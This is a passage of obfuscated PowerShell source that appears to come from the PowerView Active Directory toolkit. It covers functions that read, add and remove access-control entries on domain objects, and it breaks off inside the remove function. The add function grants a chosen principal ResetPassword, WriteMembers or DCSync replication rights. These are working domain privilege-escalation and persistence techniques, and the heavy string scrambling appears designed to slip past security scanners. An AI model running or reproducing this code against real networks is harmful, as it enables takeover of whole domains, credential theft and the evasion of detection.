                        &("{2}{1}{0}" -f'e-Verbose','t','Wri') ('[Get'+'-Do'+'mai'+'nO'+'bjec'+'tAcl] '+'Extr'+'ac'+'ted'+' '+'dom'+'ain '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${Se`AR`CHe`RArGU`menTs}[("{0}{2}{1}" -f 'Dom','n','ai')] = ${ideNti`TYdo`M`Ain}
                        ${S`earch`ER} = &("{3}{2}{1}{0}{4}" -f 'Searc','in','ma','Get-Do','her') @SearcherArguments
                        if (-not ${SeA`RCh`Er}) {
                            &("{4}{2}{0}{3}{1}"-f'e-War','ing','t','n','Wri') ('[Get-'+'Doma'+'inObjec'+'t'+'Acl'+'] '+'Unable'+' '+'to'+' '+'retr'+'i'+'eve '+'do'+'main'+' '+'searc'+'her '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${IDeN`TitYInsT`AN`ce} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${GuId`BYt`e`STRInG} = (([Guid]${I`dEntItY`insTA`NcE}).("{3}{0}{2}{1}"-f'Ar','y','ra','ToByte').Invoke() | &("{0}{1}{2}{3}" -f'ForEac','h','-Objec','t') { '\' + ${_}.("{1}{0}{2}"-f'oS','T','tring').Invoke('X2') }) -join ''
                    ${ide`NtiTYFI`Lt`eR} += "(objectguid=$GuidByteString)"
                }
                elseif (${IdEN`TITyi`NS`TA`NcE}.("{0}{1}{2}" -f'Conta','i','ns').Invoke('.')) {
                    ${idE`N`T`ItYFiLTeR} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    ${i`De`NTIT`YFIl`Ter} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if (${iD`eN`T`Ity`FILtEr} -and (${Id`e`NTitYf`ilTeR}.("{1}{0}"-f'rim','T').Invoke() -ne '') ) {
                ${F`iLtER} += "(|$IdentityFilter)"
            }

            if (${p`SbO`UNdPARa`meTeRs}[("{0}{2}{1}{3}"-f'LD','il','APF','ter')]) {
                &("{1}{0}{2}"-f'os','Write-Verb','e') ('[Get-'+'Dom'+'ain'+'Obj'+'ec'+'tAcl] '+'Us'+'ing '+'addi'+'tional'+' '+'LD'+'AP '+'fil'+'ter: '+"$LDAPFilter")
                ${F`iLTer} += "$LDAPFilter"
            }

            if (${F`ILTEr}) {
                ${sEAr`Ch`Er}."fi`lTEr" = "(&$Filter)"
            }
            &("{0}{3}{2}{1}"-f'Write','se','o','-Verb') "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter) "

            ${re`suLTs} = ${SeA`R`ChEr}.("{1}{0}"-f 'ndAll','Fi').Invoke()
            ${ResU`ltS} | &("{0}{1}{2}{3}"-f'W','here-Ob','jec','t') {${_}} | &("{3}{1}{0}{2}" -f'bjec','O','t','ForEach-') {
                ${Ob`JE`Ct} = ${_}."P`R`OPERti`es"

                if (${objE`ct}."ObJ`Ects`iD" -and ${O`BJect}."OBj`ECT`SID"[0]) {
                    ${o`BjeC`TsiD} = (&("{0}{2}{1}" -f'New-Obje','t','c') ("{2}{8}{0}{1}{6}{4}{3}{5}{7}" -f 'Security.Princ','i','System','entifi','l.SecurityId','e','pa','r','.')(${O`Bje`CT}."ObJect`s`ID"[0],0))."VA`Lue"
                }
                else {
                    ${ObJ`ec`TsID} = ${N`UlL}
                }

                try {
                    &("{1}{0}{2}" -f 'Obje','New-','ct') ("{3}{6}{9}{5}{2}{10}{11}{4}{8}{1}{7}{0}" -f 'r','ipt','rol.Ra','Se','De','.AccessCont','cu','o','scr','rity','wSecur','ity') -ArgumentList ${O`Bje`ct}[("{3}{4}{1}{0}{2}" -f'e','yd','scriptor','nts','ecurit')][0], 0 | &("{1}{2}{4}{3}{0}" -f 'Object','F','o','h-','rEac') { if (${PS`B`OUNDPa`RA`mE`TErs}[("{0}{1}"-f'Sa','cl')]) {${_}."sYS`T`eMacl"} else {${_}."di`sCreTIonAR`Ya`CL"} } | &("{1}{0}{3}{2}" -f'ch-Obj','ForEa','t','ec') {
                        if (${pS`BO`UNdp`AR`A`METerS}[("{1}{2}{0}"-f 'r','Right','sFilte')]) {
                            ${Gu`Id`F`IltER} = Switch (${r`IGhts`F`ILter}) {
                                ("{0}{3}{2}{1}"-f 'R','assword','tP','ese') { ("{2}{4}{5}{0}{6}{3}{1}" -f'0-246d-1','06e0529','0029','aa0','9','57','1d0-a768-00') }
                                ("{2}{3}{1}{0}"-f'embers','M','Wri','te') { ("{1}{0}{7}{3}{6}{4}{5}{8}{2}" -f 'f967','b','049e2','-','-a28','5-00a','11d0','9c0-0de6','a003') }
                                ("{1}{0}" -f 'ult','Defa') { ("{9}{7}{4}{1}{3}{6}{0}{8}{2}{5}"-f'00-0','0-0','00','000-0000-','00000','000','00','0','000000','0') }
                            }
                            if (${_}."oBJE`C`TtypE" -eq ${GuId`Fi`LtEr}) {
                                ${_} | &("{2}{0}{1}" -f 'd-Me','mber','Ad') ("{0}{2}{1}" -f 'N','rty','otePrope') ("{1}{2}{0}" -f 'tDN','Obje','c') ${Obj`ecT}."Di`st`inGUiSHEDN`AME"[0]
                                ${_} | &("{0}{2}{1}"-f 'Add','ember','-M') ("{2}{3}{0}{1}"-f 'ePro','perty','N','ot') ("{1}{2}{0}" -f'SID','Obje','ct') ${ObJ`e`C`TSid}
                                ${cOn`T`INue} = ${TR`Ue}
                            }
                        }
                        else {
                            ${_} | &("{3}{2}{1}{0}"-f 'ber','m','-Me','Add') ("{3}{0}{2}{1}"-f 'e','perty','Pro','Not') ("{1}{0}"-f 'ctDN','Obje') ${OBj`ect}."dI`Stin`GUiShednA`mE"[0]
                            ${_} | &("{2}{3}{0}{1}" -f'Mem','ber','Add','-') ("{2}{1}{0}" -f'perty','ePro','Not') ("{1}{0}{2}"-f 'I','ObjectS','D') ${ob`JEC`TS`ID}
                            ${c`ONtI`Nue} = ${t`RuE}
                        }

                        if (${CON`T`InUe}) {
                            ${_} | &("{0}{2}{1}" -f 'Ad','mber','d-Me') ("{2}{0}{1}" -f 'e','rty','NoteProp') ("{3}{6}{1}{0}{2}{5}{4}" -f 'irect','iveD','or','Ac','ts','yRigh','t') (  ${0`BZ}::"T`oobJ`eCt"([System.DirectoryServices.ActiveDirectoryRights], ${_}."aC`Ce`S`sMAsk"))
                            if (${g`UIDS}) {
                                
                                ${aC`l`prOPErtIEs} = @{}
                                ${_}."p`S`OBjEct"."pr`OPEr`T`iEs" | &("{2}{1}{0}" -f 't','jec','ForEach-Ob') {
                                    if (${_}."n`AMe" -match ((("{9}{4}{13}{10}{20}{14}{7}{17}{2}{3}{19}{0}{22}{12}{5}{15}{16}{11}{8}{21}{18}{1}{6}" -f 'e','y','Obje','ctType{0}Ob','T','Typ','pe','e','dObject','Object','Inhe','nherite','e','ype{0}','it','e','{0}I','d','T','j','r','Ace','ctAc'))-F[CHAR]124)) {
                                        try {
                                            ${ac`lp`Roperti`eS}[${_}."n`Ame"] = ${G`U`iDs}[${_}."Val`Ue".("{0}{2}{1}" -f'toS','ng','tri').Invoke()]
                                        }
                                        catch {
                                            ${aCL`pRoPeRti`ES}[${_}."NA`mE"] = ${_}."V`ALue"
                                        }
                                    }
                                    else {
                                        ${AclpRO`perT`iES}[${_}."N`AME"] = ${_}."Va`LUe"
                                    }
                                }
                                ${Ou`To`Bject} = &("{2}{0}{1}"-f'bje','ct','New-O') -TypeName ("{2}{1}{0}" -f 'ct','SObje','P') -Property ${aClPr`OP`ERt`ieS}
                                ${OUTOBj`E`CT}."PS`OBjE`ct"."T`Y`PeNaMes".("{0}{1}"-f'Inse','rt').Invoke(0, ("{2}{4}{1}{3}{0}" -f 'L','rView.','P','AC','owe'))
                                ${o`UtObje`cT}
                            }
                            else {
                                ${_}."PSOB`j`ECT"."TY`PEna`MES".("{1}{0}" -f'rt','Inse').Invoke(0, ("{1}{2}{0}{3}" -f'werView.A','P','o','CL'))
                                ${_}
                            }
                        }
                    }
                }
                catch {
                    &("{3}{1}{0}{2}"-f'Verbo','-','se','Write') ('[Get'+'-'+'DomainO'+'bject'+'Acl'+']'+' '+'Erro'+'r:'+' '+"$_")
                }
            }
        }
    }
}


function aD`D-d`OMA`inOBJECTA`CL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}{3}"-f'uldProc','SSho','P','ess'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(posItIoN = 0, vAlUeFRoMpiPEliNe = ${TR`UE}, vAlueFromPiPeLINEbypROpeRtYNAME = ${Tr`Ue})]
        [Alias({"{3}{0}{4}{1}{2}"-f'ingu','hedN','ame','Dist','is'}, {"{4}{1}{0}{3}{2}" -f 'c','amA','e','countNam','S'}, {"{1}{0}"-f'ame','N'})]
        [String[]]
        ${T`ARgEt`IdEN`TItY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${TA`RGetDOMA`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'ilter','F'})]
        [String]
        ${t`ArgEtl`Da`pf`iLTeR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${ta`Rg`ets`EaRc`Hbase},

        [Parameter(MandaTory = ${T`Rue})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pr`incIp`AL`iDEnTITy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${prINcIpaLdo`m`A`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{2}{1}"-f 'Dom','r','nControlle','ai'})]
        [String]
        ${SEr`Ver},

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{0}{1}{2}" -f 'OneLev','e','l'}, {"{0}{1}"-f'Subtre','e'})]
        [String]
        ${Se`A`RChscO`PE} = ("{1}{0}"-f 'tree','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rEs`ULTpa`GESI`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`erve`R`TiME`LiMIt},

        [Switch]
        ${t`omb`STOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`eDE`NT`iaL} =  (  &("{0}{3}{1}{2}"-f'GeT','it','EM','-chIld')  ("VA"+"RiAb"+"le:5R0vK"))."v`ALue"::"e`mptY",

        [ValidateSet('All', {"{1}{0}{2}"-f'wo','ResetPass','rd'}, {"{3}{0}{2}{1}"-f 'e','s','Member','Writ'}, {"{1}{0}" -f'c','DCSyn'})]
        [String]
        ${ri`gH`Ts} = 'All',

        [Guid]
        ${R`i`gHtsG`UID}
    )

    BEGIN {
        ${TAr`GEtsEarC`heRA`RgU`mentS} = @{
            ("{2}{1}{0}"-f'ties','r','Prope') = ("{1}{4}{3}{5}{0}{2}"-f 'n','d','ame','nguish','isti','ed')
            'Raw' = ${Tr`UE}
        }
        if (${psBOuND`P`A`Ra`MeTErS}[("{3}{1}{2}{0}" -f 'ain','tDo','m','Targe')]) { ${TA`R`GeTsE`ArCHERA`RGuments}[("{1}{0}"-f'n','Domai')] = ${TARgEtD`oMa`iN} }
        if (${psB`O`UNdpA`RaMEtERs}[("{0}{2}{1}"-f'TargetL','ilter','DAPF')]) { ${tArget`s`earC`hERARGu`Me`N`TS}[("{2}{1}{0}"-f'r','PFilte','LDA')] = ${t`ArG`ETl`daPF`ILtEr} }
        if (${Ps`B`o`UN`DpaRAm`EterS}[("{2}{4}{1}{0}{3}" -f 'arc','e','Target','hBase','S')]) { ${tar`G`etSEarChE`RArGu`m`EnTS}[("{1}{3}{0}{2}"-f'chB','Sea','ase','r')] = ${Ta`RgE`T`seA`RCHbAsE} }
        if (${p`S`BoUNd`PaR`AMeTERs}[("{1}{0}{2}"-f 've','Ser','r')]) { ${TaRGEtsEA`R`ChErA`R`g`Um`eNTS}[("{0}{1}" -f'Ser','ver')] = ${SE`RV`ER} }
        if (${PsBOundp`ArAme`Te`RS}[("{2}{1}{0}"-f 'pe','Sco','Search')]) { ${Tar`geTSearCH`ER`ARGu`M`ents}[("{1}{2}{3}{0}" -f'cope','S','ear','chS')] = ${SE`Archs`CopE} }
        if (${pSbou`Nd`p`A`RA`METers}[("{1}{2}{3}{0}"-f'ize','ResultP','ag','eS')]) { ${TArgEtS`e`A`RC`he`R`ArGU`MenTs}[("{1}{3}{2}{0}" -f 'e','Re','ultPageSiz','s')] = ${reSU`l`TP`Age`Size} }
        if (${PS`BO`U`NdPar`AmEte`Rs}[("{0}{1}{2}{3}"-f'S','erv','erTimeL','imit')]) { ${TARge`Tse`A`RCHERa`RgUMeNTS}[("{3}{1}{2}{4}{0}" -f'mit','erverTim','e','S','Li')] = ${S`e`RveRtImeL`Imit} }
        if (${p`Sbo`UNDPaRaM`ET`eRS}[("{0}{1}{2}{3}" -f 'T','ombs','t','one')]) { ${taRge`T`SEA`RCheR`ARgUm`eN`TS}[("{1}{2}{0}" -f 'mbstone','T','o')] = ${ToM`BSt`o`NE} }
        if (${P`S`Bo`UndPaRA`mET`ERS}[("{2}{3}{0}{1}" -f 'ntia','l','C','rede')]) { ${Targ`EtSEarCh`eRAR`G`UM`En`Ts}[("{0}{1}{2}"-f 'C','redenti','al')] = ${cReD`En`TI`AL} }

        ${pRincipAlseARC`h`ER`ArGu`meNTS} = @{
            ("{1}{0}" -f'ntity','Ide') = ${PR`InCi`paliDeNTi`TY}
            ("{1}{2}{0}" -f'ies','Pro','pert') = ("{1}{2}{0}{3}{4}"-f'guishe','d','istin','d','name,objectsid')
        }
        if (${p`sbOuN`dP`ArAmEt`ERs}[("{0}{1}{2}{3}" -f'P','r','incipal','Domain')]) { ${p`RiN`cipalSE`ArchE`RAR`GU`ME`NTS}[("{0}{1}"-f'Do','main')] = ${PrINcip`AldO`m`Ain} }
        if (${psb`Ou`Nd`pARAME`TERS}[("{1}{0}" -f'er','Serv')]) { ${P`Rinc`IPaLsEARCheRA`Rg`UM`eN`TS}[("{1}{2}{0}"-f 'ver','S','er')] = ${SeRV`ER} }
        if (${PSBo`UNd`P`AraM`eters}[("{1}{2}{0}"-f 'rchScope','S','ea')]) { ${P`RI`NcIPAl`SEaRcheRA`RGuMENTs}[("{2}{3}{1}{0}"-f'e','cop','Sea','rchS')] = ${SEa`RcH`s`cOpe} }
        if (${psbo`UNDPARam`eT`eRS}[("{2}{1}{0}{3}" -f'z','geSi','ResultPa','e')]) { ${pr`INcIP`AlseaR`ChErAr`G`Ume`NtS}[("{4}{3}{0}{2}{1}"-f 'sult','ize','PageS','e','R')] = ${REsu`ltpA`G`eSI`ze} }
        if (${PSBo`U`N`d`PARa`mEtERS}[("{4}{1}{0}{3}{2}"-f 'meL','rTi','mit','i','Serve')]) { ${p`RINcI`PAl`seaR`CHe`RaR`GUMenTs}[("{1}{0}{2}{4}{3}" -f'e','Serv','r','it','TimeLim')] = ${serv`E`RTi`Mel`ImiT} }
        if (${PsbounD`p`A`R`Ameters}[("{2}{0}{1}" -f'ombst','one','T')]) { ${P`RINcI`Pa`LSEARcHeRar`gUM`ENtS}[("{1}{2}{0}" -f 'e','Tombs','ton')] = ${T`Om`Bs`TONE} }
        if (${pSBO`U`NdP`Aram`eT`Ers}[("{2}{1}{0}" -f 'al','redenti','C')]) { ${pRin`ciPa`lSE`ARChEra`RgUME`Nts}[("{1}{2}{0}" -f'al','C','redenti')] = ${cRe`DE`NTI`AL} }
        ${pR`I`NcipALs} = &("{2}{1}{0}{3}"-f'ai','et-Dom','G','nObject') @PrincipalSearcherArguments
        if (-not ${P`RInCIpA`ls}) {
            throw ('Unab'+'le '+'t'+'o '+'r'+'esolve '+'pr'+'incip'+'a'+'l: '+"$PrincipalIdentity")
        }
    }

    PROCESS {
        ${tar`Ge`TsearCHeR`A`RgU`Ments}[("{1}{2}{0}"-f'y','Id','entit')] = ${tAR`get`id`ENTITy}
        ${Tar`g`ETS} = &("{0}{4}{3}{1}{5}{2}" -f 'Get-','Obj','t','ain','Dom','ec') @TargetSearcherArguments

        ForEach (${tAR`Ge`TO`BJ`ECT} in ${TA`R`GeTS}) {

            ${I`NheRit`Ancet`ypE} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ("{0}{1}"-f'Non','e')
            ${cOnT`R`oLT`Ype} = [System.Security.AccessControl.AccessControlType] ("{1}{0}"-f 'llow','A')
            ${ac`ES} = @()

            if (${RIG`Hts`GUiD}) {
                ${G`UIdS} = @(${righT`S`G`UID})
            }
            else {
                ${g`UIdS} = Switch (${r`I`gHTs}) {
                    
                    ("{3}{2}{1}{0}"-f 'rd','o','setPassw','Re') { ("{0}{4}{8}{2}{7}{5}{3}{6}{1}"-f '002','006e0529','70','-00a','99','d-11d0-a768','a','-246','5') }
                    
                    ("{2}{1}{0}" -f 's','ember','WriteM') { ("{4}{1}{2}{6}{3}{5}{0}"-f'e2','c0-0de6-','1','a285-00aa00','bf9679','3049','1d0-') }
                    
                    
                    
                    
                    ("{0}{1}"-f'DCSy','nc') { ("{4}{2}{6}{1}{8}{5}{0}{3}{7}"-f '00','1-f','1','c0','1','f-','31f6aa-9c07-11d','4fc2dcd2','79'), ("{2}{7}{3}{4}{6}{5}{0}{1}{8}" -f '00c0','4','1131f','d-9','c07-1','9f-','1d1-f7','6a','fc2dcd2'), ("{2}{5}{0}{7}{3}{1}{6}{4}" -f '-4','-0','89','2-991a','40c','e95b76-444d','facbeda6','c6')}
                }
            }

            ForEach (${P`RInCIp`ALo`Bject} in ${p`R`INC`iPALS}) {
                &("{2}{1}{0}"-f'se','ite-Verbo','Wr') "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) "

                try {
                    ${i`d`e`NTiTy} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${PrIncIpA`loB`Je`cT}."ob`jectS`iD")

                    if (${g`U`IDS}) {
                        ForEach (${g`UId} in ${guI`DS}) {
                            ${n`ewgU`iD} = &("{0}{2}{3}{1}" -f 'New-','ct','Ob','je') ("{0}{1}" -f 'Gu','id') ${Gu`Id}
                            ${ADR`I`gHts} = [System.DirectoryServices.ActiveDirectoryRights] ("{1}{0}{2}"-f'Righ','Extended','t')
                            ${a`CeS} += &("{1}{3}{0}{2}" -f'b','New','ject','-O') ("{8}{3}{0}{7}{5}{9}{13}{6}{10}{2}{12}{1}{4}{14}{11}" -f'c','Ac','r','m.Dire','ce','yS','ces.Acti','tor','Syste','erv','veDirecto','ule','y','i','ssR') ${i`de`NT`ity}, ${ADrig`H`Ts}, ${CO`NTrolT`ypE}, ${NEW`guiD}, ${iNHEr`I`TANCE`T`yPe}
                        }
                    }
                    else {
                        
                        ${AD`Ri`g`hts} = [System.DirectoryServices.ActiveDirectoryRights] ("{0}{2}{1}" -f'G','cAll','eneri')
                        ${a`Ces} += &("{0}{2}{1}"-f'New-','t','Objec') ("{0}{8}{4}{7}{2}{3}{1}{6}{5}" -f'Syste','Di','vices.A','ctive','.Dir','ccessRule','rectoryA','ectorySer','m') ${IdeNt`I`Ty}, ${A`dR`IGhtS}, ${Cont`ROlTy`pE}, ${inheRiTAN`C`e`TypE}
                    }

                    
                    ForEach (${a`Ce} in ${A`ces}) {
                        &("{2}{1}{4}{3}{0}"-f 'rbose','ri','W','-Ve','te') "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname) "
                        ${tArG`Ete`Ntry} = ${tArGETOBj`e`CT}.("{0}{2}{3}{1}{5}{4}" -f'G','ctor','etD','ire','try','yEn').Invoke()
                        ${TA`RGe`TENT`Ry}."p`SbASe"."o`p`TionS"."secUrI`Ty`MASkS" = ("{0}{1}"-f'Da','cl')
                        ${TA`RgEt`e`NTry}."P`SB`ASE"."objE`c`Tse`CU`RItY".("{2}{1}{0}{3}{4}"-f 'u','ssR','AddAcce','l','e').Invoke(${A`ce})
                        ${t`ARgete`N`TRY}."P`sBasE".("{0}{2}{1}{3}" -f 'C','mmitC','o','hanges').Invoke()
                    }
                }
                catch {
                    &("{1}{3}{0}{2}"-f 'erb','W','ose','rite-V') "[Add-DomainObjectAcl] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_ "
                }
            }
        }
    }
}


function Re`MOVe-dO`mAino`B`jEcT`A`cl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{2}{4}"-f'dP','houl','roce','PSS','ss'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(poSitiOn = 0, vaLUEfrompiPEline = ${T`RUE}, VAlUEFRompIpelinEbyproPertynaME = ${t`RUE})]
        [Alias({"{4}{2}{0}{3}{1}"-f 'ishe','Name','ngu','d','Disti'}, {"{3}{2}{0}{1}"-f 'o','untName','Acc','Sam'}, {"{0}{1}"-f 'Na','me'})]
        [String[]]
        ${TARGeT`i`den`T`ITY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${tAR`geT`dOm`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'lter','F','i'})]
        [String]
        ${t`A`RgeT`L`DapfILt`ER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${T`A`Rgets`e`Arch`BaSe},

        [Parameter(MANdaTORY = ${t`RUE})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`R`in`Cipa`Liden`TIty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${pr`INCipA`LDo`mAIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{2}{1}{4}"-f 'Do','l','o','mainContr','ler'})]
        [String]
        ${s`ERVEr},

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{0}{2}{1}"-f 'O','l','neLeve'}, {"{0}{1}"-f 'Subtr','ee'})]
        [String]
        ${SEarch`S`COpE} = ("{0}{1}" -f 'S','ubtree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rEsuL`TPagesi`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERvErt`i`MeLI`miT},

        [Switch]
        ${t`O`MbStone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`eDENTiAl} =  ( &("{0}{1}{2}"-f 'gET-','VArIA','bLe')  ('5r0'+'Vk')  -vaL)::"Em`ptY",

        [ValidateSet('All', {"{1}{0}{2}{4}{3}"-f'eset','R','Pa','word','ss'}, {"{0}{3}{2}{1}" -f'Wr','bers','eMem','it'}, {"{1}{0}" -f 'Sync','DC'})]
        [String]
        ${riG`H`TS} = 'All',

        [Guid]
        ${R`ig`hTSguid}
    )

    BEGIN {
        ${ta`RGE`TS`E`ARch`ERa`RgUm`ENTs} = @{
            ("{1}{2}{0}"-f'ies','Pro','pert') = ("{4}{3}{1}{0}{2}"-f 'guishednam','tin','e','s','di')
            'Raw' = ${tR`UE}
        }
        if (${ps`BOunD`pAR`AMeTers}[("{0}{1}{2}"-f'TargetD','oma','in')]) { ${tARGETSE`Ar`cHE`R`ArGUme`Nts}[("{0}{1}" -f 'Doma','in')] = ${taR`G`e`TdomaIn} }
        if (${pSBouN`D`p`ARam`ETERS}[("{2}{0}{3}{4}{1}" -f 'rget','PFilter','Ta','L','DA')]) { ${tArgETS`eaR`CHeRAR`gUM`eNTs}[("{1}{2}{0}"-f'ter','L','DAPFil')] = ${TaRgeT`ldAP`F`ILTer} }
        if (${pSbO`UndparA`met`eRS}[("{0}{3}{1}{4}{2}" -f'Targe','S','Base','t','earch')]) { ${tArgetseA`RCHEr`A`R`GUm`ENts}[("{0}{3}{1}{2}" -f 'Sea','Bas','e','rch')] = ${TAr`Getsea`RCHb`ASE} }
        if (${p`sbO`Un`DP`ArA`mEteRS}[("{1}{0}" -f 'erver','S')]) { ${TARGE`T`SE`ArCHe`Rar`g`UMENtS}[("{0}{1}"-f 'Ser','ver')] = ${S`ERVEr} }
        if (${Psb`o`UNd`PaRAMETErS}[("{0}{2}{3}{1}" -f'S','e','earchSc','op')]) { ${tAr`gET`sEa`R`CHeRa`RGum`Ents}[("{2}{1}{0}"-f'e','cop','SearchS')] = ${se`Ar`cHsC`OPe} }
        if (${p`s`BOu`NDPAr`AmEt`ErS}[("{0}{2}{1}"-f 'ResultP','ze','ageSi')]) { ${tarGetS`EA`RcH`E`R`ARGumE`NTs}[("{0}{3}{4}{1}{2}"-f 'R','eS','ize','e','sultPag')] = ${reSul`TP`AGes`iZE} }
        if (${P`sb`OunD`PaRa`mE`TErS}[("{4}{0}{3}{2}{1}" -f'e','imit','rTimeL','rve','S')]) { ${TaRGET`Se`AR`ch`erARGumenTS}[("{2}{1}{4}{3}{0}"-f 'mit','e','Serv','imeLi','rT')] = ${S`eRvert`IME`li`Mit} }
        if (${Ps`BouNDP`ARAme`TErs}[("{2}{1}{0}"-f 'e','bston','Tom')]) { ${TargEtSearC`HER`ArgUm`E`NTs}[("{0}{2}{3}{1}"-f 'To','e','mbs','ton')] = ${ToMBS`T`O`NE} }
        if (${psbOU`NdpA`Ra`m`eTERS}[("{1}{0}{2}"-f'd','Cre','ential')]) { ${TaR`gETSEARchE`Rar`G`UMEnTS}[("{0}{3}{2}{1}"-f 'C','l','dentia','re')] = ${C`R`eDEnTIal} }

        ${PRi`N`C`IpAl`seARChE`RaRGU`mE`NTS} = @{
            ("{1}{0}"-f 'entity','Id') = ${prInC`ipa`l`i`de`NTITY}
            ("{1}{2}{0}" -f 's','Pro','pertie') = ("{0}{4}{7}{2}{8}{3}{6}{1}{5}" -f 'dis',',object','d','a','tinguis','sid','me','he','n')
        }
        if (${P`sBoUNdPArA`M`e`Te`Rs}[("{1}{2}{4}{3}{0}"-f'omain','Pri','n','ipalD','c')]) { ${P`RInCipaL`sEaRcH`erAr`gU`mentS}[("{2}{0}{1}" -f 'm','ain','Do')] = ${PrINcIpaL`doM`A`iN} }
        if (${ps`BouN`dPaRa`mEt`Ers}[("{1}{2}{0}" -f'er','Se','rv')]) { ${PrIN`CipALs`EArCheRA`Rgu`ME`Nts}[("{1}{0}"-f'ver','Ser')] = ${SErv`Er} }
        if (${PS`B`oun`dPARA`mEteRs}[("{0}{1}{3}{2}"-f'Searc','hSc','e','op')]) { ${PrINC`IpAL`SEaRche`R`ArG`UM`enTs}[("{1}{0}{3}{2}" -f'o','SearchSc','e','p')] = ${sEa`RChS`cO`pe} }
        if (${PSbou`Nd`P`ArAM`EtERs}[("{0}{2}{1}{3}"-f 'R','PageS','esult','ize')]) { ${PRin`CIpALs`eA`Rc`HERARg`UmeNTS}[("{0}{1}{3}{2}{4}" -f'R','esultPa','eSi','g','ze')] = ${R`eS`ULt`pAgesIze} }
        if (${P`S`BouNdpa`RAmeteRs}[("{4}{3}{2}{0}{1}" -f 'eL','imit','rverTim','e','S')]) { ${pRI`NciPAlseAR`chE`RA`R`G`Uments}[("{4}{0}{3}{2}{1}" -f 'erTi','mit','i','meL','Serv')] = ${SeRV`eR`Time`l`imIt} }
        if (${p`S`BOuNdP`ArAMe`TeRS}[("{2}{0}{1}"-f 'mbs','tone','To')]) { ${PriNCiPA`l`SEaRch`ErA`RG`UMe`NTs}[("{0}{1}{2}" -f'Tombs','ton','e')] = ${TOm`B`s`TOne} }
        if (${psBOun`d`pa`RaMete`Rs}[("{0}{2}{1}"-f'Cred','ntial','e')]) { ${PR`INc`i`paLs`EaR`ChErarguMEntS}[("{0}{1}{3}{2}" -f'Cr','ed','ntial','e')] = ${Cr`ED`e`NTiAL} }
        ${prI`N`cip`ALS} = &("{0}{2}{3}{1}{4}"-f'G','c','et-DomainObj','e','t') @PrincipalSearcherArguments
        if (-not ${PRin`Cip`A`LS}) {
            throw ('Unabl'+'e '+'t'+'o '+'r'+'esolve '+'p'+'ri'+'ncip'+'al: '+"$PrincipalIdentity")
        }
    }

    PROCESS {
        ${TaR`GEtSEa`RcHerA`Rg`UMenTs}[("{1}{0}" -f'ntity','Ide')] = ${Ta`RGE`TIDEnT`itY}
        ${Ta`R`GETS} = &("{0}{3}{2}{1}"-f'Get-Domai','t','jec','nOb') @TargetSearcherArguments

        ForEach (${Ta`RgETOb`jeCT} in ${TARg`E`TS}) {

            ${In`H`ErITAN`ceT`Ype} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ("{1}{0}" -f 'ne','No')
            ${cOnt`R`o`LType} = [System.Security.AccessControl.AccessControlType] ("{1}{0}" -f'w','Allo')
            ${A`ceS} = @()

            if (${ri`gHTS`G`UId}) {
                ${Gu`IDs} = @(${rIgH`TS`GuID})
            }
            else {
                ${guI`DS} = Switch (${RIg`hts}) {
                    
                    ("{2}{1}{0}"-f'word','etPass','Res') { ("{4}{2}{0}{5}{3}{6}{1}"-f'd0-a7','06e0529','246d-11','8-00a','00299570-','6','a0') }
                    
                    ("{0}{1}{3}{2}"-f 'Writ','eMe','bers','m') { ("{3}{0}{5}{6}{4}{7}{1}{2}" -f '0','e','2','bf9679c','85-00aa003','-0de6-11d0-','a2','049') }
                    
                    
                    
                    
                    ("{1}{2}{0}" -f 'c','D','CSyn') { ("{7}{2}{6}{5}{8}{4}{3}{1}{0}" -f '2','2dcd','aa','c04fc','0','9c07-11d1-f','-','1131f6','79f-0'), ("{2}{7}{1}{9}{4}{8}{5}{6}{0}{3}" -f'c','f6ad-9','113','d2','1d1-f79f','04fc2','d','1','-00c','c07-1'), ("{0}{1}{6}{8}{3}{4}{7}{5}{2}" -f'89e','9','c','44d-','4c62-991a-0','acbeda640','5b76-','f','4')}
                }
            }

            ForEach (${PRi`NcIPALoBJ`E`ct} in ${Pr`in`cIP`Als}) {
